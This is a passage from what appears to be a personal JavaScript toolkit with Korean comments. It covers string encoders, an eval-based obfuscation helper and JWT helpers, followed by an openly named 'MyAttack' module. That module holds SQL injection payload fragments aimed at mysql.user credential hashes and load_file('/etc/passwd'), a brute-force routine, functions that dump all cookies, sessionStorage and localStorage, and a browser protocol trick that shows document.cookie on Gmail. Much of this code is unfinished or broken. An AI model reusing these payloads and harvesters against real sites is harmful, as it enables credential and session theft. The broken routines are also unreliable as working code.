			result+="\n\t\"HTML-ASCII-10\": " + "\"" 
				+ "엘리태그.(inner|outer)HTML+="+MyBase.getStrToHTML_ascii10(str) 
			+ "\"" + ','

			result+="\n\t\"HTML-ASCII-16\": " + "\"" 
				+ "엘리태그.(inner|outer)HTML+="+MyBase.getStrToHTML_ascii16(str)    
			+ "\"" + ','			
			
			result+="\n\t\"encodeURI\": "+ "\"" + encodeURI(str) + "\"" + ','
			result+="\n\t\"decodeURI\": "+ "\"" + decodeURI(encodeURI(str)) + "\"" + ','  
			
			result+="\n\t\"encodeURIComponent\": "+ "\"" + encodeURIComponent(str) + "\"" + ','
			result+="\n\t\"decodeURIComponent\": "+ "\"" + decodeURIComponent(encodeURIComponent(str)) + "\"" + ','
			
			result+="\n\t\"escape\": "+ "\"" + escape(str) + "\"" + ','  
			result+="\n\t\"unescape\": "+"\"" + unescape(escape(str)) + "\"" + ','  
			
			
			result+="\n\t\"ENCODE-UTF-8\": "+"\"" + MyBase.encode('utf-8',str) + "\"" + ','
			result+="\n\t\"DECODE-UTF-8\": "+"\"" + MyBase.decode('utf-8',MyBase.encode('utf-8',str)) + "\"" + ','
			
			result+="\n\t\"ENCODE-UTF-16\": "+"\"" + MyBase.encode('utf-16',str) + "\"" + ','
			result+="\n\t\"DECODE-UTF-16\": "+"\"" + MyBase.decode('utf-16',MyBase.encode('utf-16',str)) + "\"" + ','
			
			   
			
			result+="\n\t\"ENCODE-EUC-KR\": "+"\"" + MyBase.encode('euc-kr',str) + "\"" + ','
			result+="\n\t\"DECODE-EUC-KR\": "+"\"" + MyBase.decode('euc-kr',MyBase.encode('euc-kr',str)) + "\"" + ','
			
			result+="\n\t\"ENCODE-ISO-8859-1\": "+"\"" + MyBase.encode('iso-8859-1',str) + "\"" + ','
			result+="\n\t\"DECODE-ISO-8859-1\": "+"\"" + MyBase.decode('iso-8859-1',MyBase.encode('iso-8859-1',str)) + "\"" + ','
			
			result+="\n\t\"ENCODE-BASE64\": " + "\"" + btoa(str) + "\"" + ','
			
			
			obfuscation_code = MyBase.getStrToObfuscationJSCode(str)
			if(MyLibrary.f_check_valid(obfuscation_code)){  
				result+="\n\t\"OBFUSCATION-JSCODE\": " + "\"\n\t"   
					+ `eval(${obfuscation_code});`
					+ `${my_result_or_string}` + `new Function('${obfuscation_code}')();` 
				+ "\n\t\"" + ','
			}
			 
			
			try { result+="\n\t\"DECODE-BASE64\": " + "\"" + atob(str) + "\"" + ',' } catch(e){}     
			
			result+="\n\t\"ESCAPE-HTML\": " + "\"" + escapeHTML(str) + "\"" + ','
			
			 
			//ret=ret.substring(ret.length-1,1);
			
			result = result.replace(/,$/,'');  
			result+="\n\n\n}"
			
			ret=undefined;
		}catch (e) {}  
		
		return result+"\n";
	}
		
}




function getFindChangeDecodeUri(strings){ 
			// ( url | uri ) 있는지 검증 후 uri 만 변환 후 반환
	var decode_Uri='';
	var matched_urls=window.undefined;
	matched_urls = strings.match( new RegExp(/(http[s]?|.*\?.+=.+)+.+/,'img') )
	if(matched_urls != window.undefined){
		for(var key in matched_urls){
			//console.log('원래 url => ' + matched_urls[key]);
			strings = strings.replaceAll(matched_urls[key],decodeURIComponent(matched_urls[key]))
		}				
	}
		return strings;
}





var MyEnDeCryption = {
	Hash:{
		
	},
	
	JWT:{
		init:()=>{
			window.param1 = {  
				method: "POST",  
				url: "/MyLibraryAndTools/MyEnDeCryption",            //protocol://hostname:port/pathname?name=value&searchparam#hash    
				async: "false",  //true<비동기>또는false<동기>  
				withCredentials: "true", //true<cors 일 ? 쿠키 보냄>또는false<안보냄>
				send_querystring: ""
			}			
		},
		
		encode: (obj)=>{// MyEnDeCryption.JWT.encode( {}헤더 , 페이로드 ,비밀키)
			//MyEnDeCryption.JWT.encode({payload: {"email":"devhudi@gmail.com","name":"Hudi","isAdmin":true} , privatekey: '비밀키'})
			MyEnDeCryption.JWT.init(); 
			window.param1.send_querystring += `jwt=true` 
			
			header = ''
			if(MyLibrary.f_check_valid(obj.header)){
				header = JSON.stringify(obj.header);
			}else{
				header = JSON.stringify({
				  alg: "HS256",
				  typ: "JWT",
				})
			}
			window.param1.send_querystring += `&encode=true&header=${header}`
			
			
			payload = ''
			if(MyLibrary.f_check_valid(obj.payload)){
				payload = JSON.stringify(obj.payload);
				/* 
				{
					"iss": "발급자",
					"sub": "제목",
					"aud": "대상자",
					"exp": "expiration 만료시간ms초현시간보다이후로설정되있어야됨",
					"nbf": "not before 활성시간ms초지나기전까지는토큰처리안됨",
					"iat": "age 발급된시간ms초해당값으로토큰발급이언제됐는지확인가능",
					"jti": "식별자중복처리방지때사용ㄱ일회용토큰에사용시유용.",
					"http://호.도/../uri": "public claim 충돌방지를위해키를uri로지정ㄱ",
					"키": "값 private claim 서버 클라 송수신간 협의하여 사용되는 즉 키가 중복될수있음."
	    
				}
				
				*/
			}
			window.param1.send_querystring += `&payload=${payload}`
			
			
			
			privatekey = ''
			if(MyLibrary.f_check_valid(obj.privatekey)){
				privatekey = obj.privatekey;
			}
			
			window.param1.send_querystring += `&privatekey=${privatekey}`
			
			
			MyLibrary.Base.xmlHttpRequest( window.param1 )
			
			return window.xmlHttpRequest.responseText.replace('\r\n',''); 
		},
		decode: (obj)=>{
			
			/* 
				MyEnDeCryption.JWT.decode( 
					{  
						header_payload_signature: MyEnDeCryption.JWT.encode({payload: {"email":"devhudi@gmail.com","name":"Hudi","isAdmin":true} , privatekey: '비밀키'}) ,  
						privatekey: "비밀키"
					} 
				)
			*/
			
			
			MyEnDeCryption.JWT.init();
			window.param1.send_querystring += `jwt=true&decode=true`
			
			
			
			
			
			if(MyLibrary.f_check_valid(obj.header_payload_signature)){
				window.param1.send_querystring += `&header_payload_signature=${obj.header_payload_signature}`
			}
			
			if(MyLibrary.f_check_valid(obj.privatekey)){
				window.param1.send_querystring += `&privatekey=${obj.privatekey}`
			}			
			
			MyLibrary.Base.xmlHttpRequest( window.param1 )
			
			return window.xmlHttpRequest.responseText.replace('\r\n',''); //'{"alg":"HS256","typ":"JWT"}.{"email":"devhudi@gmail.com","name":"Hudi","isAdmin":true}.KeefPR1ixDwoNnBQ77YsBYQxXFkZR1VcAkah6yle5lk'
		}
	}
	
	
	
	
}























//네이버는 sessionStorage 사용 x 임.

var MyAttack = {

	getMySQLInjectionDictionaryAttack : (parm1,parm2)=>{ //parm1 에 union select 뒤에 쓰일 문장 ㄱㄱ
		var result=""
		var list_ifs = {
			1:["' ",'" '],
			2:['or ','|| ','and ','&& '],
			3:['1','true'], //3이 생략 됐을 시 사용하게끔 ㄱ
			4:[';'],
			5:['#','-- ','/*']

		} 
		var list_union = {
			1:["' ",'" '],
			2:['union select ' + parm1 , 'union distinct select ' + parm1 ], 
			// parm1 != undefined 시  포함.
			// 밑에 columns 이용 ㄱ, tables, wheres 이용 ㄱㄱ 
			3:['from '], // tables 이용 ㄱ
			4:['where '],// ifs 이용 ㄱ
			5:['limit 0,1'],
			6:[';'],
			7:['#','-- ','/*']
		};
		
		//select
		var columns = [ //에서 조회 될.. 공격구문 함수 등....
			'user,authentication_string ','table_schema ','table_name ','column_name ','* ','database() ','version() ','user() ','current_user() ','load_file("/etc/passwd") ',
		]
		//from
		var tables = [
		'mysql.user ','information_schema.columns ',' '
		]
		//where
		
		var 알아낸_테이블_이름 , 알아낸_컬럼_이름; // 블라인드인젝션으로 알아낼것.
		var ifs = [
			'column_name regexp \'.*priv$\'','table_name regexp \'(global|session)_variables$\' ','table_schema = database() ','table_schema = database() and table_name = ' + 알아낸_테이블_이름 , 'table_schema = database() and table_name = ' + 알아낸_테이블_이름 +' column_name = ' + 알아낸_컬럼_이름
			,''
		]
	},

	getBruteforceTable:()=>{//아스키 , 유니(utf-8) .. 집어넣을것
		var result=""
		result+=MyBase.getListToStr(MyBase.range(48,57));
		result+=MyBase.getListToStr(MyBase.range(65,90));
		result+=MyBase.getListToStr(MyBase.range(97,122));   
		return result
	},
	bruteForce:(url,ms,brute_ch_length)=>{

			
		if(MyBase != window.undefined){
			try{ var table = MyAttack.getBruteforceTable(); } catch(e){console.error("MyBase  " +e);}
			//url 분리해서 ㄱ
			var origin,pathname,search;
			var brute_ch=[],first=0,last=0,before=0,after=0,cur=0,count=0;
			
			for(var i=0;i<10;i++){ // 정답 일 시 무한반복 멈춰야 됨. 현재 테스트로 10번만 반복임. 무한요청(java 에서 httpurlconnection ㄱㄱ ) 해야됨.
				for(var ch of table){
					var timeout = window.setTimeout(function() {
						brute_ch[cur] = ch; // 0인덱      부터 저장됨.
						console.log("brute_ch["+cur+"] = > " + brute_ch[cur]); 
							
					}, ms)
						//내부에서 url 요청해야됨. setinterval ㄲ 
				} 
				cur++; // z 끝났으므로 다음 인덱으로 잡아줌.
				
				
				
				
				
				brute_ch[before]/*처음 0*/ = table[before/*처음 a*/];  
					//이전 인덱스가 z 라면 이전 인덱스 증가.
				if(brute_ch[before] == table[table.length-1]) before++;
					// 현재 문자가 z 라면
				if(ch == table[table.length-1]) cur=0
				
			}
			
				
			
				
		} else console.log('테이블없음');

		
	},
	'getAllSessionStorage' : function(){  
		if(sessionStorage.length > 0){
			var result='!!!!_MY_CUR_TAB_!!!!:'+decodeURIComponent(location.href)+'\n';
			
			var uris=[] 
			
			for(var i=0;i < sessionStorage.length;i++){
				var key = sessionStorage.key(i);
				result+=sessionStorage.getItem(key)+"\n";
			}
			uris=result.match(new RegExp(/search\?.*/,'img')) 
			if(uris != window.undefined){
				uris = uris.toString().split('search?')  
				for(var i=1;i < uris.length;i++){
					result = result.replace(uris[i].split(',')[0],decodeURIComponent(uris[i].split(',')[0]))
				}
			}
			
			return result;  
		}
		
	},
	'getAllLocalStorage':function(){
		var result='';
		for(var i=0;i<localStorage.length;i++){
			var key=localStorage.key(i);
			
			result+=key+":"+localStorage.getItem(key)+";";
		}
		result=getFindChangeDecodeUri(result);
		return result;
	},
	
	'getAllDocumentCookie':function(){
		var result='!!!!_MY_CUR_TAB_!!!!:'+decodeURIComponent(location.href)+'\n';
		var key_value = getFindChangeDecodeUri(
				document.cookie.replaceAll(';','\n')
		);
		result+=key_value;  
		
		return result;
	},     
	            
	'attackChromeGmail': function(){
		var timeout = 'setTimeout("alert(document.cookie);",4000);document.location.assign("http://www.gmail.com");';
		document.location = 'chromehtml:"80%20javascript:document.write(timeout)"'
	}
} 


var MyTool = {
	'ToolketCommandWindow':{
		"help": ()=>{
			result+=""; return result;
		},
		'open': ()=>{ window.open('/JSPproject/ToolKit_CommandWindow.jsp')}
	}
}




//====================== 현재 안됨. 수정해야됨. =========================
/*window.onload = (e)=>{
	console.log("window onload MyAttack.js");   
} 

window.onmessage = (e)=>{
	//추가정리 해야됨.
	switch(e.data){
		case "getAllSessionStorage":
			window.postMessage(MyAttack.getAllSessionStorage())
			break;
		case "getAllLocalStorage":
			window.postMessage(MyAttack.getAllLocalStorage());
			break;
		case "getAllDocumentCookie":
			window.postMessage(MyAttack.getAllDocumentCookie());
			break;
		
		default:
			window.postMessage("case 중에 일치하는게 없음")
			break;
	}
}*/



